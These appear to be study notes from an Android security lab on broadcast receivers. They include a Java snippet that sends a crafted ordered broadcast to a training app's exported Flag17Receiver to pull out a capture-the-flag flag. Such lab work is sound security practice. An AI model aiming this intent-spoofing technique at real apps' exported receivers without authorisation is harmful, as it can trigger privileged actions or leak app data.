# Broadcast Receiver 
- [Overview](#overview)
- [Ordered Broadcast](#ordered-broadcast)

## Overview
- There are two ways how broadcast receivers could be used by an app. First they could be exported via the AndroidManifest.xml with a `<receiver>` tag.

- The other way is by dynamically registering a receiver class using `registerReceiver()`.

> [!IMPORTANT]
> Please keep the following in mind: you do not have the required privileges to send system broadcasts to applications or to specific broadcast receivers; however, execution can still reach the `else` branch of the logic.

## Ordered Broadcast
- Send Ordered Broadcast and get results
```java
Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag17Receiver"
        ));

        // Required secret
        intent.putExtra("flag", "give-flag-17");

        sendOrderedBroadcast(
                intent,
                null,
                new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        Bundle result = getResultExtras(false);
                        if (result != null) {
                            Log.i("FLAG17", "Success: " + result.getBoolean("success"));
                            Log.i("FLAG17", "Flag: " + result.getString("flag"));
                        }
                    }
                },
                null,
                RESULT_OK,
                null,
                null
        );

        finish();
```